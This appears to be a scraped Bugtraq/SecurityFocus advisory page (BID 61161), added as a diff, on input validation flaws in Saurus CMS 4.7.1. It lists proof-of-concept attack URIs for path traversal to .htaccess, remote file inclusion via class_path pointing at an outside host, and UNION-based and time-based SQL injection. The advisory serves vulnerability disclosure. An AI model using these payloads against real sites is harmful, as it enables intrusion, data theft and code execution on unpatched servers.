@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid61161<p><b><span style="font-size: 18pt;">Saurus CMS Multiple Input Validation Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/61161/info">info</a><br><a href="http://www.securityfocus.com/bid/61161/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/61161/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/61161/solution">solution</a><br><a href="http://www.securityfocus.com/bid/61161/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				61161
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jul 14 2013 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 14 2013 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Janek Vind
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Saurused Ltd Saurus CMS 4.7.1 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can use a browser to exploit these issues. To exploit a cross-site scripting vulnerability, an attacker must entice an unsuspecting victim to follow a malicious URI.  <br/> <br/>The following example URIs are available:  <br/> <br/>http://www.example.com/saurus471/admin/fckeditor_dialog_image.php?file_id=10572&amp;amp;dialog=../../../.htaccess  <br/> <br/>http://www.example.com/saurus471/extensions/saurus4/captcha_image.php?captchaimage_type=gif&amp;amp;captchaimage_width=50&amp;amp;captchaimage_height=50&amp;amp;captchaeffects0name=../waraxe  <br/> <br/>http://www.example.com/saurus471/map.php?cmd=www.example2.com\test.php  <br/> <br/>http://www.example.com/saurus471/admin/change_config.php?class_path=www.example2.com/?  <br/> <br/>http://www.example.com/saurus471/admin/repair_database.php?class_path=www.example2.com/?  <br/> <br/>http://www.example.com/saurus471/admin/check_adminpage.php?class_path=http://php.net/?  <br/> <br/>http://www.example.com/saurus471/?speed_debug=on&amp;amp;id=0&amp;amp;pg='+UNION+SELECT+SLEEP(5)%23  <br/>http://www.example.com/saurus471/index.php?op=search&amp;amp;speed_debug=on&amp;amp;sites=&amp;amp;apos;)UNION+SELECT+SLEEP(5)%23  <br/> <br/>http://www.example.com/saurus471/admin/error_log.php?err_type='UNION+SELECT+1,1,1,1,@@version,1,1,1,1,1,1%23  <br/> <br/>http://www.example.com/saurus471/admin/error_log.php?algus=aa-'UNION+SELECT+1,1,1,1,@@version,1,1,1,1,1,1%23  <br/> <br/>http://www.example.com/saurus471/admin/error_log.php?lopp=aa-'+AND+0+UNION+SELECT+1,1,1,1,@@version,1,1,1,1,1,1%23  <br/> <br/>http://www.example.com/saurus471/admin/extensions.php?sortby=1  <br/> <br/>http://www.example.com/saurus471/admin/ajax_response.php?op=check_file&amp;amp;name=..././..././/..././..././/..././..././/foobar.txt
+	
+		<ul>
+</ul>
+</div>
